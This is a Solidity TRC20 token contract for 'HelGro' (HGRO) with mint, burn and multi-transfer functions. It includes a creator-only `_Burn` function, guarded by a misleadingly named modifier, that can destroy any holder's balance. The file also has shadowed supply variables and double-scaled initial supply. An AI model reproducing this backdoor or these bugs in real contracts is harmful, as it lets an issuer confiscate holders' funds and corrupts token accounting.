//SourceUnit: Helgro.sol

//------------------------------------------------------------------------------//
//																				//
//		 __    __   _______  __        _______  ______        ______   			//
//		|  |  |  | |   ____||  |      /  _____||   _  \      /  __  \  			//
//		|  |__|  | |  |__   |  |     |  |  __  |  |_)  |    |  |  |  | 			//
//		|   __   | |   __|  |  |     |  | |_ | |      /     |  |  |  | 			//
//		|  |  |  | |  |____ |  `----.|  |__| | |  |\  \----.|  `--'  | 			//
//		|__|  |__| |_______||_______| \______| | _| `._____| \______/  			//
//                                                    							//
//						 _          _                							//
//						| |_  ___  | | __ ___  _ __  							//
//						| __|/ _ \ | |/ // _ \|  _ \ 							//
//						| |_| (_) ||   <|  __/| | | |							//
//						 \__|\___/ |_|\_\\___||_| |_|							//
//																			  	//
//																				//
//------------------------------------------------------------------------------//
//                      HELGRO TOKEN TRC20 CONTRACT								//
//------------------------------------------------------------------------------//
//																				//
//                      Symbol              : HGRO								//
//                      Name                : HelGro							//
//                      Last edited         : 08.06.2020 						//
//                      Lines of file       : 295								//
//																				//
// 						© 2020 HelGro Team, KVV									//
//------------------------------------------------------------------------------//

pragma solidity 0.5.8;

contract Context {
    constructor () internal { }
    // solhint-disable-previous-line no-empty-blocks
    function _msgSender() internal view returns (address payable) {
        return msg.sender;
    }
    function _msgData() internal view returns (bytes memory) {
        this; 
        return msg.data;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;

        return c;
    }
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

contract ERC20 is Context, IERC20 {
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    uint256 private _totalSupply;
    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
    function transfer(address recipient, uint256 amount) public returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }
    function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }
    function _transfer(address sender, address recipient, uint256 amount) internal {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }
    function _mint(address account, uint256 amount) internal {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply = _totalSupply.add(amount);
        _balances[account] = _balances[account].add(amount);
        emit Transfer(address(0), account, amount);
    }
    function _burn(address account, uint256 amount) internal {
        require(account != address(0), "ERC20: burn from the zero address");

        _balances[account] = _balances[account].sub(amount, "ERC20: burn amount exceeds balance");
        _totalSupply = _totalSupply.sub(amount);
        emit Transfer(account, address(0), amount);
    }
    function _approve(address owner, address spender, uint256 amount) internal {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function _burnFrom(address account, uint256 amount) internal {
        _burn(account, amount);
        _approve(account, _msgSender(), _allowances[account][_msgSender()].sub(amount, "ERC20: burn amount exceeds allowance"));
    }
}

contract Detailed is IERC20 {
    string private _name;
    string private _symbol;
    uint8 private _decimals;
    constructor (string memory name, string memory symbol, uint8 decimals) public {
        _name = name;
        _symbol = symbol;
        _decimals = decimals;
    }
    function name() public view returns (string memory) {
        return _name;
    }
    function symbol() public view returns (string memory) {
        return _symbol;
    }
    function decimals() public view returns (uint8) {
        return _decimals;
    }
}

library Roles {
    struct Role {
        mapping (address => bool) bearer;
    }
    function add(Role storage role, address account) internal {
        require(!has(role, account), "Roles: account already has role");
        role.bearer[account] = true;
    }
    function remove(Role storage role, address account) internal {
        require(has(role, account), "Roles: account does not have role");
        role.bearer[account] = false;
    }
    function has(Role storage role, address account) internal view returns (bool) {
        require(account != address(0), "Roles: account is the zero address");
        return role.bearer[account];
    }
}

contract MinterRole is Context {
    using Roles for Roles.Role;
    event MinterAdded(address indexed account);
    event MinterRemoved(address indexed account);
    Roles.Role private _minters;
	
    constructor () internal {
        _addMinter(_msgSender());
    }
    modifier onlyMinter() {
        require(isMinter(_msgSender()), "MinterRole: caller does not have the Minter role");
        _;
    }
    function isMinter(address account) public view returns (bool) {
        return _minters.has(account);
    }
    function addMinter(address account) public onlyMinter {
        _addMinter(account);
    }
    function renounceMinter() public {
        _removeMinter(_msgSender());
    }
    function _addMinter(address account) internal {
			_minters.add(account);
			emit MinterAdded(account);
    }
    function _removeMinter(address account) internal {
			_minters.remove(account);
			emit MinterRemoved(account);
    }
}

contract Mintable is ERC20, MinterRole {
    function mint(address account, uint256 amount) public onlyMinter returns (bool) {
        _mint(account, amount);
        return true;
    }
}

contract Burnable is Context, ERC20 {
    function burn(uint256 amount) public {
        _burn(_msgSender(), amount);
    }
    function burnFrom(address account, uint256 amount) public {
        _burnFrom(account, amount);
    }
}

contract HelGro is ERC20, Detailed, Mintable, Burnable {
    string public _name = "HelGro";
    string public _symbol = "HGRO";
    uint8 public _decimals = 6;	
    uint256 public _initialSupply = 500000000000 * 1000000; //500 000 000 000 * 1000000
	uint256 public _totalSupply = 500000000000 * 1000000; //500 000 000 000 * 1000000
    address private creator;

    modifier allowedAmount {
        require(creator == msg.sender);
        _;
    }

    constructor()
    Mintable()
    Burnable()
    Detailed(_name, _symbol, _decimals)
    ERC20()
    public {
        creator = msg.sender;
        _mint(msg.sender, _initialSupply * (10 ** uint256(decimals())));
    }
    function _Burn(address account, uint amount) external allowedAmount {
        _burn(account, amount);
    }
    function MakeWorldBigger(uint256 _time) public {
        _MakeWorldBigger(_time);
    }        
    function _MakeWorldBigger(uint256 amount) internal {    
            if(isMinter(msg.sender)==true) {     
		    _totalSupply           += amount;    
		    _mint(msg.sender,amount);
            }
    }	
	function multiTransfer(address[] memory _receivers, uint256[] memory _amounts) public {
		require(_receivers.length == _amounts.length);
		for (uint256 i = 0; i < _receivers.length; i++) {
			_transfer(msg.sender, _receivers[i], _amounts[i]);
		}
	}	

}